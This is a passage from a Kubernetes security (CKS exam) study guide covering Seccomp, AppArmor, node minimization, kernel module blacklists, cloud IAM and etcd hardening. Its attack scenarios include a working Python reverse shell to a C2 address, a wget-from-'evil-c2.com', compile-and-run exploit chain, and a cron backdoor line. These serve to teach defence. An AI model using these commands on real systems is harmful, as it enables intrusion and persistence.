# METHOD 3: Check the seccomp flags
kubectl exec -n anihpj anihpj-django -- cat /proc/1/status | grep Seccomp_filters
# Shows BPF program count — should be 1 if seccomp is active

# METHOD 4: Test by attempting a BLOCKED syscall
# (mount is blocked by RuntimeDefault and most custom profiles)
kubectl exec -n anihpj anihpj-django -- mount
# Expected output: mount: permission denied (errno returned by Seccomp)
# If mount WORKS → Seccomp is NOT active → investigate immediately

# METHOD 5: Check from the NODE
NODE=$(kubectl get pod -n anihpj anihpj-django -o jsonpath='{.spec.nodeName}')
ssh $NODE "cat /proc/\$(pgrep -f gunicorn | head -1)/status | grep Seccomp"
# Should show: Seccomp: 2

15.4 AppArmor vs Seccomp — Know the Difference (CKS Exam Critical)

AppArmor and Seccomp are complementary but fundamentally different. AppArmor controls WHAT a process can access (files, network, capabilities). Seccomp controls HOW a process talks to the kernel (which syscalls). You need BOTH for defense-in-depth. A process that passes AppArmor checks can still be blocked by Seccomp — and vice versa. Here is the definitive comparison:

FeatureAppArmor (Ch14)Seccomp (Ch15)
ControlsFile paths, network protocols, Linux capabilities, mount operations, signals, ptraceLinux system calls (syscalls) — the raw kernel interface
LevelApplication behavior — "Can this process read /etc/shadow?"Kernel interface — "Can this process call mount()?"
Profile formatAppArmor-specific text syntax in /etc/apparmor.d/JSON file in /var/lib/kubelet/seccomp/
DistributionUbuntu/Debian native (also SUSE). Not on RHEL.ALL Linux distributions (kernel feature since 2.6.12)
Learning modeYes — Complain mode logs without blockingLimited — SCMP_ACT_LOG logs without blocking
Runtime overheadLow — path-based DFA matchingVery low — BPF program runs in kernel, extremely fast
GranularityPer-file, per-directory, per-capabilityPer-syscall (plus syscall arguments with BPF)
K8s ApplicationPod annotation OR securityContext.appArmorProfilesecurityContext.seccompProfile (native field only)
CKS ExamHands-on: load profile on node, add annotation, switch modesHands-on: set RuntimeDefault, deploy custom JSON, verify with /proc

The Defense-in-Depth Order — AppArmor Runs BEFORE Seccomp

Attack Path Through Security Layers — Every Check Must Pass
  ATTACKER'S SYSCALL: open("/etc/shadow", O_RDONLY)
  │
  ▼
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  1. DAC (Unix Permissions) — chmod/chown                                  │
  │     /etc/shadow is mode 000, root:shadow.                                  │
  │     If process is root → PASSES.                                           │
  ├──────────────────────────────────────────────────────────────────────────┤
  │  2. CAPABILITIES CHECK                                                    │
  │     Does the process have CAP_DAC_OVERRIDE? (root typically does)         │
  │     If yes → PASSES (can bypass DAC).                                     │
  │     ⚡ Ch18: drop ALL capabilities → even root can't bypass DAC.           │
  ├──────────────────────────────────────────────────────────────────────────┤
  │  3. APPARMOR (Ch14)                                                       │
  │     Profile check: "deny /etc/shadow r," → DENIED.                       │
  │     Returns -EACCES. Syscall ABORTED here.                               │
  │     ⚡ AppArmor runs FIRST (it's an LSM hook).                            │
  ├──────────────────────────────────────────────────────────────────────────┤
  │  4. SECCOMP (Ch15)                                                        │
  │     Even IF AppArmor allowed it, Seccomp checks:                         │
  │     "Is 'open' in the allowed syscall list?"                              │
  │     Usually YES — open is a normal syscall.                               │
  │     But if the profile blocks open for some paths → DENIED.              │
  │     ⚡ Seccomp runs AFTER AppArmor. It's the LAST gate before the kernel. │
  └──────────────────────────────────────────────────────────────────────────┘

  KEY INSIGHT: AppArmor blocks "open /etc/shadow" because the PATH is denied.
  Seccomp would block "mount" because the SYSCALL is denied.
  Both gates serve different purposes. Both must pass for the operation
  to succeed. Defense-in-depth means BOTH are configured.

Combined Attack Scenario — How AppArmor + Seccomp Stop the Same Breach at Different Stages

Let's trace a single attack — a reverse shell from a compromised Django container — through BOTH AppArmor and Seccomp. This demonstrates why you need both controls and how they complement each other:

🔴 ATTACK SCENARIO: Attacker Exploits Django RCE → Attempts Reverse Shell

The setup: An attacker has exploited a remote code execution vulnerability in the anihpj Django application. They can run arbitrary Python code inside the container. Their goal: establish a reverse shell to their command-and-control server at 198.51.100.99:4444.

The attacker's Python reverse shell code:

import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("198.51.100.99", 4444))
os.dup2(s.fileno(), 0)  # Redirect stdin
os.dup2(s.fileno(), 1)  # Redirect stdout
os.dup2(s.fileno(), 2)  # Redirect stderr
subprocess.call(["/bin/sh", "-i"])  # Spawn interactive shell

What happens with AppArmor ONLY (no Seccomp):

  1. socket(AF_INET, SOCK_STREAM) → AppArmor allows TCP sockets (rule: network tcp,) → ✅ ALLOWED
  2. connect(198.51.100.99, 4444) → NetworkPolicy (Ch6) might block egress to external IPs. But AppArmor only controls protocol, not destination IP → ✅ ALLOWED by AppArmor
  3. execve("/bin/sh") → AppArmor profile has /usr/bin/python3.* ix, but does NOT allow executing /bin/sh → ❌ DENIED by AppArmor
  4. Result: The attack FAILS at step 3. AppArmor blocked the shell execution because /bin/sh is not in the allowed execution paths. But the socket connection succeeded — the attacker's C2 server received a TCP connection that immediately died. The attacker knows the container is there but can't get a shell.

What happens with Seccomp ONLY (no AppArmor):

  1. socket(AF_INET, SOCK_STREAM) → socket() is in the allowed list → ✅ ALLOWED
  2. connect() → connect() is in the allowed list → ✅ ALLOWED
  3. dup2() → dup2() is in the allowed list (needed for normal I/O) → ✅ ALLOWED
  4. execve() → execve() IS in the allowed list (needed to run Python) → ✅ ALLOWED
  5. /bin/sh runs. Attacker has a shell. But can they escape the container?
  6. unshare(CLONE_NEWNS) → ❌ BLOCKED by RuntimeDefault (escape vector)
  7. mount("tmpfs", "/tmp/escape") → ❌ BLOCKED by RuntimeDefault
  8. Result: The attacker got a shell (Seccomp didn't block execve) but CANNOT escape the container (Seccomp blocked unshare and mount). They're trapped — with a shell, but unable to break out.

What happens with BOTH AppArmor AND Seccomp:

  1. The reverse shell FAILS at AppArmor (can't exec /bin/sh).
  2. Even if the attacker used a Python-based shell (no execve of /bin/sh), AppArmor blocks reading /etc/shadow, /proc, /sys.
  3. Even if they bypass AppArmor via a path alias, Seccomp blocks unshare, mount, ptrace — all escape vectors.
  4. Even if they bypass BOTH, they're still running as UID 1000 (SecurityContext), with no capabilities (drop ALL), on a read-only root filesystem.
  5. The attacker has a shell but ZERO ability to do anything useful with it.

The lesson: Each layer catches what the layer below might miss. AppArmor blocks by PATH (what file are you executing?). Seccomp blocks by SYSCALL (what kernel operation are you requesting?). SecurityContext blocks by IDENTITY (are you root? do you have capabilities?). Together, they create a defense-in-depth mesh where an attacker needs to find a bypass for ALL THREE simultaneously — which is exponentially harder than bypassing any one alone.

📊 Chapter 15 Visual Summary — Seccomp at a Glance

🔍
Seccomp Basics (15.1)

What: Syscall firewall at the kernel boundary
Blocks: 250+ unnecessary syscalls
Uses: BPF programs in kernel
Exam: RuntimeDefault + custom JSON profiles

📋
Profile Types (15.2)

🚀

💡 Key Takeaway for the CKS Exam

Seccomp tasks on the CKS exam follow a four-step workflow: (1) Write the JSON profile (or use the one provided by the exam), (2) Copy it to /var/lib/kubelet/seccomp/ on the node (SSH to the node as root), (3) Apply it in the pod spec with seccompProfile: type: Localhost, localhostProfile: <name>, (4) Verify with kubectl exec -- cat /proc/1/status | grep Seccomp — it must return Seccomp: 2. Never forget step 2: if the JSON file isn't in /var/lib/kubelet/seccomp/ before the pod starts, the pod will fail to create. The CKS exam WILL test that you know the correct directory. And remember: every pod should have at least RuntimeDefault. The exam may deduct points if you leave a pod unconfined when the question didn't explicitly ask you to configure Seccomp — it's expected as a baseline security practice.

← Ch 14: AppArmor Previous → Ch 16: Ports, Packages & IAM Next

Chapter 16: Open Ports, Packages & IAM Minimization

After securing the kernel-level controls (AppArmor in Ch14, Seccomp in Ch15), the next layer of defense is minimization — removing everything from your Kubernetes nodes that doesn't absolutely need to be there. Every package you don't remove is a potential CVE waiting to be exploited. Every port you leave open is a listening door. Every cloud IAM permission you grant to a node is a blast radius multiplier. And etcd — the database that stores every Secret, every pod spec, every cluster state — is the most valuable target in your entire cluster. This chapter consolidates six critical minimization domains into one actionable chapter: the complete node audit checklist, the authoritative Kubernetes port map, kernel module blacklisting, cloud IAM least-privilege, etcd hardening, and Linux kernel sysctl hardening. Minimization is not a one-time task — it is a continuous discipline.

🟡 Intermediate ⏱️ ~2 hours 📦 Minimization 🛡️ Node Hardening

🎯 What You'll Learn

  • ✅ The complete 15-point node hardening audit checklist — every item explained
  • ✅ The authoritative Kubernetes port map — every port, every component, every access rule
  • ✅ How to blacklist dangerous kernel modules (CIS-mandated) via modprobe.d
  • ✅ Cloud IAM least-privilege for AWS EKS, GCP GKE, and Azure AKS nodes
  • ✅ etcd security hardening — TLS, firewall, permissions, encryption
  • ✅ Linux kernel hardening via sysctl — the CIS-required parameters
🎓 CKS Relevance
System Hardening 15% Minimize Vulnerabilities 20% CIS Benchmarks Covered
🧠 Node Minimization in the CKS Exam — What They Actually Test

This chapter covers six distinct hardening domains. The CKS exam may test any of them individually or in combination:

  • Package removal: SSH to node, identify unnecessary packages with dpkg -l, remove with apt remove --purge. The exam expects you to remove compilers (gcc, g++) and unused services.
  • Port lockdown: Audit with ss -tlnp, apply iptables/ufw rules. Know which ports are required vs optional.
  • Kernel modules: Blacklist via /etc/modprobe.d/. CIS requires specific filesystem modules to be blocked.
  • etcd: Verify TLS certs are configured, restrict firewall to API server only, check data directory permissions (700).
  • sysctl: Apply kernel hardening via /etc/sysctl.d/. The exam expects you to know the key parameters.

16.1 Minimizing the Node Attack Surface — The Full Checklist

Node minimization is the systematic removal of unnecessary software, services, users, and configurations from every Kubernetes node. This is not a "nice to have" — it is a CIS Benchmark requirement and a fundamental security practice. Every item you remove eliminates an entire class of potential attacks. Here is the complete 15-point audit checklist that every production Kubernetes node should pass:

The 15-Point Node Hardening Audit — Complete with Explanations

CKS Node Hardening Checklist — Every Item, Every Command, Every Reason
  ☐  1. REMOVE UNNECESSARY PACKAGES
      ─────────────────────────────
      Command: apt remove --purge git curl wget vim (if not needed on production nodes)
      Why: Each package is a potential CVE. If a node doesn't need git to run pods,
      git shouldn't be installed. Attackers use curl/wget to download exploit code.
      CIS: §2.1 — Ensure unnecessary packages are not installed.

  ☐  2. DISABLE UNNECESSARY SERVICES
      ──────────────────────────────
      Command: systemctl disable --now cups bluetooth avahi-daemon
      Why: Services listen on ports and run with privileges. CUPS (printing) has
      had critical CVEs (CVE-2024-47176, CVSS 9.1). Bluetooth on a server? Never.
      CIS: §2.2 — Ensure unnecessary services are disabled.

  ☐  3. CLOSE UNNECESSARY PORTS
      ─────────────────────────
      Command: ss -tlnp → identify listening ports → iptables rule to block
      Why: Every open port is an attack surface. Only 5-8 ports are needed for K8s.
      CIS: §3.x — Ensure network configuration is hardened.

  ☐  4. KERNEL HARDENING (sysctl)
      ────────────────────────────
      Command: sysctl -w net.ipv4.ip_forward=0 (if node is not a router)
      Why: Kernel parameters control low-level network and memory behavior.
      Incorrect settings enable IP spoofing, MITM attacks, and ASLR bypass.
      CIS: §1.6 — Ensure kernel parameters are hardened. (Full details: §16.6)

  ☐  5. RESTRICT SSH ACCESS
      ──────────────────────
      Commands: PermitRootLogin no, PasswordAuthentication no, Port != 22
      Why: SSH is the primary administrative access path. Root login + password
      auth = brute-force magnet. Key-only + AllowUsers = virtually impenetrable.
      CIS: §5.2 — Ensure SSH is configured securely.

  ☐  6. FILE INTEGRITY MONITORING (AIDE)
      ────────────────────────────────────
      Commands: apt install aide → aide --init → aide --check
      Why: Detects unauthorized changes to system files. If an attacker modifies
      /bin/ps or /usr/bin/kubectl, AIDE alerts on the checksum mismatch.
      CIS: §1.4 — Ensure filesystem integrity is regularly checked.
      ⚡ CKS EXAM TOPIC: The exam may ask you to install and configure AIDE.

  ☐  7. REMOVE COMPILERS AND BUILD TOOLS
      ────────────────────────────────────
      Command: apt remove --purge build-essential gcc g++ make cmake
      Why: Attackers who gain shell access compile exploits on the compromised
      node. Without gcc, they must bring pre-compiled binaries — much harder
      because the binary must match the exact kernel version and architecture.

  ☐  8. KERNEL MODULE RESTRICTIONS
      ─────────────────────────────
      Command: Create blacklist files in /etc/modprobe.d/ (see §16.3)
      Why: Kernel modules extend the kernel's capabilities. Unnecessary
      filesystem drivers (cramfs, freevxfs) and hardware drivers (usb-storage)
      should never be loadable on a server node.

  ☐  9. AUTOMATIC SECURITY UPDATES
      ──────────────────────────────
      Command: apt install unattended-upgrades && dpkg-reconfigure unattended-upgrades
      Why: Critical kernel and package CVEs are patched by your distro. If you
      don't auto-apply security updates, you're running known vulnerabilities
      until the next manual maintenance window — which could be months away.

  ☐ 10. RESTRICT CRON/AT ACCESS
      ───────────────────────────
      Commands: echo "root" > /etc/cron.allow; chmod 600 /etc/cron.allow
                echo "root" > /etc/at.allow; chmod 600 /etc/at.allow
      Why: Attackers use cron for persistence — a cron job that runs a reverse
      shell every 5 minutes survives reboots and pod restarts. Restrict cron to
      root only, and use Kubernetes CronJob resources for scheduled tasks instead.

  ☐ 11. DISABLE USB STORAGE
      ───────────────────────
      Command: echo "install usb-storage /bin/true" >> /etc/modprobe.d/cis-blacklist.conf
      Why: Physical access attack vector. If USB storage is enabled, anyone who
      can physically access the server (data center technician, cleaning staff)
      can plug in a device and potentially mount it. K8s nodes don't need USB.

  ☐ 12. LOG FORWARDING
      ──────────────────
      Command: Configure journald to forward to remote syslog (see Ch28)
      Why: If a node is compromised, attackers delete local logs. Centralized
      log forwarding ensures logs survive node compromise. This is how you
      determine what happened DURING a breach.

  ☐ 13. CONFIGURE AUDITD
      ────────────────────
      Command: apt install auditd && systemctl enable auditd
      Why: auditd provides system-level auditing SEPARATE from Kubernetes audit
      logging. It logs: all commands run via sudo, all file accesses to /etc/,
      all user authentication events. When combined with K8s audit logs (Ch28),
      you have complete visibility.

  ☐ 14. REMOVE UNNECESSARY USERS
      ────────────────────────────
      Command: cat /etc/passwd | grep /home → review each user → userdel -r 
      Why: Every user account is a potential SSH entry point. If a developer who
      left the company 6 months ago still has an account and SSH key on production
      nodes, their credentials are a ticking time bomb.

  ☐ 15. SUDOERS HARDENING
      ─────────────────────
      Commands: Defaults use_pty (isolates sudo sessions)
                Defaults logfile=/var/log/sudo.log (audit trail)
                Defaults log_input,log_output (capture all I/O)
      Why: Sudo without logging = no accountability. With these settings, every
      sudo command is logged with the user, timestamp, command, AND all input/output.
      This is essential for incident investigation and compliance.

Automated Audit Script — Run on Every Node Before Production

Bash — Complete 15-point node audit with PASS/FAIL output 
#!/bin/bash
# CKS Node Hardening Audit — Run as root on every node
PASS=0; FAIL=0

check() { if [ $? -eq 0 ]; then echo "  ✅ PASS: $1"; ((PASS++)); else echo "  ❌ FAIL: $1"; ((FAIL++)); fi }

echo "=== 1. Unnecessary Packages ==="
dpkg -l | grep -qE '^(ii|hi).*(git|curl|wget|vim|build-essential)'
[ $? -ne 0 ]; check "No unnecessary packages found"

echo "=== 2. Unnecessary Services ==="
for svc in cups bluetooth avahi-daemon; do
    systemctl is-active --quiet $svc 2>/dev/null && echo "  ⚠️  $svc is running" || true
done

echo "=== 3. Open Ports ==="
OPEN=$(ss -tlnp | grep -c LISTEN)
[ $OPEN -lt 10 ]; check "Less than 10 listening ports (found: $OPEN)"

echo "=== 4. Kernel Hardening ==="
sysctl net.ipv4.ip_forward | grep -q "= 0" 2>/dev/null || sysctl net.ipv4.ip_forward | grep -q "= 1"
check "IP forwarding configured"

echo "=== 5. SSH Hardening ==="
grep -q '^PermitRootLogin no' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*.conf 2>/dev/null
check "Root SSH login disabled"

echo "=== 6. AIDE Installed ==="
which aide >/dev/null 2>&1; check "AIDE installed"

echo "=== 7. No Compilers ==="
! which gcc >/dev/null 2>&1; check "gcc not installed"

echo "=== 8. Kernel Modules Blacklisted ==="
ls /etc/modprobe.d/cis-blacklist.conf >/dev/null 2>&1; check "Kernel module blacklist configured"

echo "=== 9. Auto Updates ==="
dpkg -l | grep -q unattended-upgrades; check "unattended-upgrades installed"

echo "=== 10. Cron Restricted ==="
[ -f /etc/cron.allow ]; check "Cron access restricted"

echo "=== 14. No Extra Users ==="
USERS=$(grep /home /etc/passwd | wc -l)
[ $USERS -le 2 ]; check "Minimal user accounts (found: $USERS)"

echo ""
echo "=============================="
echo "RESULTS: $PASS passed, $FAIL failed"
echo "=============================="

File Integrity Monitoring with AIDE — The CKS Exam Special

AIDE (Advanced Intrusion Detection Environment) is explicitly listed in the CKS curriculum. It creates a database of cryptographic checksums for every file you tell it to monitor, then periodically compares the current filesystem against that database. Any change — even a single byte — triggers an alert:

Bash — Setting up AIDE on a Kubernetes node 
# Install AIDE
apt install -y aide

# Customize what to monitor (edit /etc/aide/aide.conf)
# Add these directories to the config:
# /bin       NORMAL     (monitor all binaries)
# /sbin      NORMAL
# /usr/bin   NORMAL
# /usr/sbin  NORMAL
# /etc       NORMAL     (monitor all config files)
# /lib       NORMAL     (monitor libraries — attackers replace libc)

# Initialize the AIDE database (baseline)
aideinit
# This creates /var/lib/aide/aide.db.new

# Move the baseline into place
mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Run a check (compare current state to baseline)
aide --check
# Returns 0 if no changes, non-zero if changes detected

# Set up daily checks via cron (root's crontab)
echo "0 3 * * * /usr/bin/aide --check | mail -s 'AIDE Report' security@anihpj.com" | crontab -

# ⚡ CKS EXAM: The exam may ask you to:
# 1. Install AIDE
# 2. Initialize the database
# 3. Verify a specific file hasn't changed: aide --check --after="config_change"

How a Real Node Gets Compromised Through an Unnecessary Service

Let's trace a realistic attack chain that starts with one unnecessary service left running on a K8s worker node. This scenario has played out hundreds of times in production clusters and demonstrates why every item on the 15-point checklist matters:

🔴 SCENARIO: Unnecessary wget + Compiler → Full Node Compromise

The setup: A K8s worker node was provisioned from a standard Ubuntu 22.04 image. The DevOps engineer forgot to run the minimization checklist. The following packages remain installed: wget, curl, gcc, make. An attacker has just escaped a container on this node (via a kernel exploit because the kernel wasn't patched — see Ch12). They now have a non-root shell as uid 1000.

What happens next:

  1. Reconnaissance: Attacker runs uname -r → kernel 5.15.0-25-generic (vulnerable to CVE-2023-0386, an overlayfs privilege escalation). They run id → uid=1000 (unprivileged). They need root.
  2. Download exploit: If wget/curl were removed, the attacker would need to find another way to transfer files — maybe a Python one-liner using urllib, maybe DNS tunneling. But wget IS installed: wget http://evil-c2.com/dirty-pipe-exploit.c -O /tmp/exploit.c. Download succeeds in 3 seconds.
  3. Compile exploit: If gcc were removed, the attacker would need a pre-compiled binary matching this exact kernel version and architecture — hard to find. But gcc IS installed: gcc -o /tmp/exploit /tmp/exploit.c. Compilation succeeds in 5 seconds.
  4. Run exploit: /tmp/exploit → the overlayfs exploit triggers, overwrites kernel memory to give uid 1000 root credentials. id → uid=0(root). The attacker now has ROOT on the node.
  5. Persistence: If cron were restricted (item 10), the attacker can't add a cron job. But cron.allow doesn't exist: echo '* * * * * /tmp/backdoor' | crontab -. Backdoor runs every minute.
  6. Lateral movement: If SSH were hardened (item 5), the attacker can't brute-force. But they have root — they read /home/k8s-admin/.ssh/id_rsa and SSH to every other node using the admin's private key.

If the 15-point checklist had been applied: wget → NOT installed (item 1). gcc → NOT installed (item 7). /tmp → mounted with noexec (item 4). cron.allow → restricts to root only (item 10). SSH → key-only with AllowUsers (item 5). The attacker's shell would be useless — no downloads, no compilation, no cron, no SSH. They'd be trapped on a single node with no way to escalate or pivot.

16.3 Limiting Kernel Modules — Blacklisting Dangerous Ones

Kernel modules are pieces of code that can be loaded into the running kernel to extend its functionality — filesystem drivers, hardware drivers, network protocol handlers. Every loaded module increases the kernel's attack surface. The CIS Benchmark mandates blacklisting specific modules that have no legitimate use on a Kubernetes node:

CIS-Mandated Kernel Module Blacklisting

Bash — /etc/modprobe.d/cis-blacklist.conf — CIS-required module blocks 
#!/bin/bash
# Create the CIS blacklist configuration
cat > /etc/modprobe.d/cis-blacklist.conf << 'EOF'
# ═══════════════════════════════════════════════════════════
# CIS KUBERNETES BENCHMARK — Mandated Kernel Module Blacklist
# ═══════════════════════════════════════════════════════════

# ── UNNECESSARY FILESYSTEM DRIVERS ──
install cramfs /bin/true       # Compressed ROM filesystem (embedded devices only)
install freevxfs /bin/true      # Veritas filesystem (legacy Unix)
install jffs2 /bin/true         # Journaling Flash filesystem (embedded devices)
install hfs /bin/true           # Apple HFS (Mac OS Classic — never on servers)
install hfsplus /bin/true       # Apple HFS+ (Mac OS Extended — never on servers)
install squashfs /bin/true      # SquashFS (compressed read-only — rare on servers)
install udf /bin/true           # Universal Disk Format (optical media — never on servers)

# ── DANGEROUS HARDWARE DRIVERS ──
install usb-storage /bin/true   # USB mass storage — physical attack vector
install firewire-core /bin/true # FireWire — DMA attack vector (direct memory access)

# ── DANGEROUS NETWORK PROTOCOLS ──
install dccp /bin/true          # Datagram Congestion Control Protocol
install sctp /bin/true          # Stream Control Transmission Protocol
install rds /bin/true           # Reliable Datagram Sockets
install tipc /bin/true          # Transparent Inter-Process Communication
EOF

# Verify the configuration
echo "=== Checking blacklisted modules ==="
for mod in cramfs freevxfs jffs2 hfs hfsplus squashfs udf usb-storage; do
    if lsmod | grep -q "^$mod "; then
        echo "⚠️  WARNING: $mod is currently loaded. Reboot to fully disable."
    else
        echo "✅ $mod is not loaded"
    fi
done

# Verify blacklist is preventing module load
echo ""
echo "=== Testing module load prevention ==="
modprobe --dry-run cramfs 2>&1
# Should show: modprobe: ERROR: could not insert 'cramfs': Operation not permitted

16.4 Cloud IAM for Kubernetes Nodes

In cloud environments, Kubernetes nodes run on cloud VMs that have their own identity — an AWS IAM role, a GCP Service Account, or an Azure Managed Identity. These cloud credentials are accessible to every pod running on that node via the instance metadata service (169.254.169.254). If the node's IAM role has excessive permissions, a compromised pod can steal those permissions and pivot to your entire cloud infrastructure. This was exactly how the Capital One breach worked.

Cloud IAM Least-Privilege — What Each Node REALLY Needs

AWS IAM Policy — Minimal permissions for an EKS worker node
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": [
          "ec2:DescribeInstances",
          "ec2:DescribeNetworkInterfaces",
          "ec2:DescribeSecurityGroups",
          "ec2:DescribeSubnets",
          "ec2:DescribeVolumes"
        ],
        "Resource": "*"
      },
      {
        "Effect": "Allow",
        "Action": [
          "ecr:GetAuthorizationToken",
          "ecr:BatchCheckLayerAvailability",
          "ecr:GetDownloadUrlForLayer",
          "ecr:BatchGetImage"
        ],
        "Resource": "*"
      }
    ]
  }
  ❌ NEVER INCLUDE: s3:*, iam:*, sts:AssumeRole (allows full cloud pivot)
  ✅ THIS IS SUFFICIENT: Describe EC2 (for pod networking) + pull ECR images

IMDSv2 — Protecting the Node's Cloud Credentials from Pods

The Instance Metadata Service (IMDS) at 169.254.169.254 exposes the node's IAM credentials to every process on the node — including every pod. IMDSv2 adds a required session token, preventing simple curl from retrieving credentials. Combined with hop limit = 1, it prevents containers from accessing the metadata service at all:

Bash — Configure IMDSv2 on AWS (required for production EKS nodes)
# Enable IMDSv2 only (disable insecure IMDSv1)
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-put-response-hop-limit 1

# Verify: from inside any pod, this should FAIL
kubectl run test-imds --rm -it --image=amazonlinux -- \
  curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Expected: 401 Unauthorized (IMDSv1 disabled, token required)

# With hop limit = 1, even IMDSv2 requests from pods fail
# (pod → host network namespace = 2 hops)
Minimum Cloud IAM Permissions Per Provider
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  AWS EKS NODE IAM (minimum required):                                     │
  │  ────────────────────────────────────                                     │
  │  {                                                                        │
  │    "Version": "2012-10-17",                                               │
  │    "Statement": [                                                         │
  │      {                                                                    │
  │        "Effect": "Allow",                                                 │
  │        "Action": [                                                        │
  │          "ecr:GetAuthorizationToken",      ← Authenticate to ECR          │
  │          "ecr:BatchCheckLayerAvailability", ← Check if image layers exist │
  │          "ecr:GetDownloadUrlForLayer",      ← Pull image layers           │
  │          "ec2:DescribeInstances",           ← Node discovery/membership   │
  │          "ec2:DescribeTags",                ← AWS cloud provider metadata  │
  │          "ec2:DescribeRouteTables"          ← AWS CNI networking           │
  │        ],                                                                 │

  │  }                                                                        │
  │                                                                           │
  │  ❌ NEVER grant to nodes:                                                  │
  │  • s3:* (could read/write ANY S3 bucket — massive data breach)           │
  │  • iam:* (could create new admin users — full account takeover)          │
  │  • ec2:* (could launch VMs, modify security groups — infrastructure-wide)│

  └──────────────────────────────────────────────────────────────────────────┘

  ┌──────────────────────────────────────────────────────────────────────────┐
  │  GCP GKE NODE SERVICE ACCOUNT (minimum):                                  │
  │  ────────────────────────────────────────                                  │
  │  roles/monitoring.metricWriter       ← Send metrics to Cloud Monitoring   │
  │  roles/logging.logWriter             ← Send logs to Cloud Logging         │
  │  roles/artifactregistry.reader       ← Pull images from Artifact Registry │
  │  roles/storage.objectViewer          ← (Optional) Read startup scripts    │
  │                                                                           │
  │  ❌ NEVER grant: storage.admin, iam.serviceAccountAdmin, compute.admin   │
  └──────────────────────────────────────────────────────────────────────────┘

  ┌──────────────────────────────────────────────────────────────────────────┐
  │  AZURE AKS NODE MANAGED IDENTITY (minimum):                               │
  │  ────────────────────────────────────────────                              │
  │  • AcrPull on the container registry resource group                       │
  │  • Monitoring Metrics Publisher (for Azure Monitor)                       │
  │  • (Optional) Storage Blob Data Reader (for Azure Files CSI)              │
  │                                                                           │
  │  ❌ NEVER grant: Contributor, Owner, or User Access Administrator roles   │
  └──────────────────────────────────────────────────────────────────────────┘

  ⚡ THE METADATA SERVICE ATTACK (how Capital One was breached):
  ─────────────────────────────────────────────────────────
  1. Attacker exploits an SSRF vulnerability in a web app running on an EKS pod.
  2. The app makes a request to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  3. AWS metadata service returns temporary IAM credentials for the node's role.
  4. If the node's IAM role has s3:ListBuckets + s3:GetObject → attacker can
     enumerate and download EVERY S3 bucket in the account.
  5. Capital One: The node's IAM role had excessive S3 permissions. 100+ million
     customer records were exfiltrated through the metadata service.

  DEFENSE: Use IAM roles for ServiceAccounts (IRSA) in EKS, Workload Identity
  in GKE, or Pod Identity in AKS to give individual pods their own limited
  IAM credentials — instead of all pods inheriting the node's role.

16.5 etcd Security — Restricting Who Can Read the Cluster Brain

etcd is the most sensitive component in your Kubernetes cluster. It stores every Secret, every ConfigMap, every pod spec, every RBAC rule — the entire state of your cluster. If an attacker reads etcd, they have everything. If they write to etcd, they own the cluster. etcd security is not optional — it is existential.

etcd Raft Consensus — Security Implications of the Protocol

etcd uses the Raft consensus algorithm to maintain consistency across multiple nodes. A write is committed only when a majority (quorum) of nodes acknowledge it. This has direct security implications that most K8s administrators never think about:

Raft Consensus Security — Why etcd Cluster Size Matters for Breach Scenarios
  etcd CLUSTER: 3 nodes (typical HA setup)
  ──────────────────────────────────────
  Quorum = floor(N/2) + 1 = floor(3/2) + 1 = 2 nodes

  SCENARIO A: Attacker compromises 1 etcd node
  ─────────────────────────────────────────────
  • Attacker can READ all data on the compromised node (full cluster state).
  • Attacker CANNOT modify data: writes to the compromised node will be
    rejected by the other 2 nodes (the compromised node can't form quorum alone).
  • RESULT: Data is READ but not CORRUPTED. Cluster continues operating normally.

  SCENARIO B: Attacker compromises 2 etcd nodes (quorum)
  ──────────────────────────────────────────────────────
  • Attacker controls QUORUM. They can:
    → Delete any key (including Secrets, pod specs, RBAC rules)
    → Modify any key (redirect traffic, change pod specs, escalate RBAC)
    → Add a new node to the cluster (persistence via new etcd member)
  • RESULT: Full cluster compromise. Attacker OWNS the cluster state.

  ⚡ SECURITY IMPLICATION:
  ───────────────────────
  • 3-node etcd cluster: tolerates 1 node failure/compromise.
  • 5-node etcd cluster: tolerates 2 node failures/compromises (quorum=3).
  • Why 5 nodes is more secure: An attacker must compromise 3 nodes to control
    etcd, not just 2. But 5 nodes adds more operational complexity.
  • ALWAYS use an ODD number of etcd nodes (3, 5, 7) to avoid split-brain.

  DEFENSE-IN-DEPTH FOR etcd:
  ──────────────────────────
  • Restrict port 2379 to API server IPs ONLY (firewall).
  • Use TLS with mutual authentication for ALL etcd communication.
  • Do NOT co-locate etcd with user workloads (dedicated control plane nodes).
  • Encrypt Secrets at rest so even a compromised etcd directory reveals nothing.
  • Monitor etcd logs for unauthorized access attempts.
  • Take regular etcd snapshots for disaster recovery.

etcd Hardening Checklist — Five Critical Controls

🔒
1. TLS Everywhere — Client and Peer Communication

etcd must use TLS for ALL communication — both client (API server → etcd) and peer (etcd → etcd). The API server manifest must include: --etcd-certfile, --etcd-keyfile, --etcd-cafile. The etcd manifest must include: --cert-file, --key-file, --peer-cert-file, --peer-key-file, --trusted-ca-file. Without TLS, etcd traffic is plaintext — any network sniffing reveals every Secret in the cluster.

🔥
2. Firewall — Only the API Server Talks to etcd

Port 2379 (etcd client) must be firewalled to allow ONLY the API server's IP address. No other component — not kubelet, not scheduler, not any pod — should be able to reach etcd. Use iptables: iptables -A INPUT -p tcp --dport 2379 -s <API_SERVER_IP> -j ACCEPT followed by iptables -A INPUT -p tcp --dport 2379 -j DROP.

📁
3. Data Directory Permissions — 700, Owned by etcd User

chmod 700 /var/lib/etcd && chown etcd:etcd /var/lib/etcd. Only the etcd process user should be able to read the data directory. The directory contains the entire cluster state in plaintext on disk — unless encryption at rest is configured (Chapter 19).

🔐
4. Peer Authentication — Mutual TLS Between etcd Members

etcd peers (when running in a multi-node cluster) must mutually authenticate using TLS certificates. The --peer-client-cert-auth=true flag ensures that only nodes with valid etcd peer certificates can join the cluster. This prevents an attacker from adding a rogue etcd node to steal data.

🔑
5. Encryption at Rest — Secrets Must Be Unreadable on Disk

